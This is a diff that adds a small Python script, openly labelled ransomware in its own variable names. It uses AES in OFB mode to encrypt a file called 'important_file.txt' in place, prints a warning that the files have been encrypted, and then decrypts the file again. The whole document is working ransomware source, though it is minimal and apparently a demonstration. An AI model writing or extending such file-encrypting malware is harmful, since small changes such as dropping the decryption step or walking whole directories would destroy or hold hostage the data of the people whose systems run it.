@@ -1,1 +1,45 @@
+import os
+from Crypto.Cipher import AES
+from Crypto.Random import get_random_bytes
 
+
+def encrypt(key, iv):
+    ransomware_path = os.path.realpath(__file__)
+    file_path = 'important_file.txt'
+    if file_path != ransomware_path:
+        file = open(file_path, "rb")
+        data = file.read()
+        file.close()
+        file = open(file_path, "wb")
+        cipher = AES.new(key, AES.MODE_OFB, iv=iv)
+        encr = cipher.encrypt(data)
+        file.write(encr)
+        file.close()
+    print("Warning!")
+    print(f"Your files in {file_path}  have been encrypted!")
+
+
+def decrypt(key, iv):
+    ransomware_path = os.path.realpath(__file__)
+    file_path = 'important_file.txt'
+    if file_path != ransomware_path:
+        file = open(file_path, "rb")
+        e_data = file.read()
+        file.close()
+        file = open(file_path, "wb")
+        d_cipher = AES.new(key, AES.MODE_OFB, iv=iv)
+        decr = d_cipher.decrypt(e_data)
+        file.write(decr)
+        file.close()
+    print(f"Your files in {file_path}  have been decrypted!")
+
+
+def main():
+    key = get_random_bytes(16)
+    cipher = AES.new(key, AES.MODE_OFB)
+    iv = cipher.iv
+    encrypt(key, iv)
+    decrypt(key, iv)
+
+
+main()
